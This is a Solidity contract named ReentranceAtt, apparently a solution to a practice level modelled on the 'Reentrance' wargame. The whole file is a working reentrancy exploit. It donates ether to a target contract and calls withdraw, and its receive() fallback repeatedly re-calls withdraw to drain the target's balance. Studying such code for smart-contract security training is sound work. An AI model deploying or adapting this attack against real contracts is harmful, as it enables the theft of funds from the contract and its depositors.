// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

interface Reentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract ReentranceAtt {
    function attack(address target, uint256 amount) public payable {
        require(amount == msg.value);
        Reentrance(target).donate.value(amount)(address(this));
        Reentrance(target).withdraw(amount);
    }

    receive() external payable {
        Reentrance(msg.sender).withdraw(msg.value);
    }
}
